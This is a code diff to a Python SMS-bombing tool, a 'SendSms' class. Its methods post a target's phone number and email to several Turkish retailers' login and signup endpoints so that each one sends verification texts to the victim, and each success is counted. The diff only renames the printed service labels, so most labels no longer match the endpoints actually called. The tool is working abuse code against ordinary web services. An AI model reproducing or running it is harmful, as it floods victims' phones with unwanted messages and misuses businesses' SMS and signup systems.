@@ -33,12 +33,12 @@ class SendSms():
             json={"countryCode": "90", "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "Success":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> KahveDünyası")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> A101")
                 self.adet += 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> KahveDünyası")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> A101")
         
      #bim_guncel
     def TRENDYOLGO(self):
@@ -46,21 +46,21 @@ class SendSms():
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
-                "Origin": "https://www.bim.com.tr",
-                "Referer": "https://www.bim.com.tr/"
+                "Origin": "https://trendyolgo.com",
+                "Referer": "https://trendyolgo.com/"
             }
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", 
                                 json={"phone": self.phone}, 
                                 headers=headers, 
                                 timeout=10)
             if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> BIM")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> TRENDYOLGO")
                 self.adet += 1
             else:
                 print(f"{Fore.RED}[!] Sunucu Hatası: {bim.status_code}")
                 raise
         except Exception as e:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> BIM")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> TRENDYOLGO")
 
     #file.com.tr
     def ALİAMCAEXPRESS(self):
@@ -70,12 +70,12 @@ class SendSms():
             json={"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> FileMarket")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> ALİAMCAEXPRESS")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> FileMarket")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> ALİAMCAEXPRESS")
 
     #evidea.com
     def ÖNCÜDÖNER(self):
@@ -85,12 +85,12 @@ class SendSms():
             data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)      
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> Evidea")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> ÖNCÜDÖNER")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> Evidea") 
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> ÖNCÜDÖNER") 
  
     # Porty
     def MİGROS(self):
@@ -105,12 +105,12 @@ class SendSms():
             
             r = requests.post(url, json=payload, headers=headers, timeout=10)
             if "success" in r.text.lower() or r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> Porty")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> MİGROS")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> Porty")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> MİGROS")
 
     #dominos.com.tr
     def BURGERKİNG(self):
@@ -120,9 +120,9 @@ class SendSms():
             json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> Dominos")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> BURGERKİNG")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> Dominos")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> BURGERKİNG")
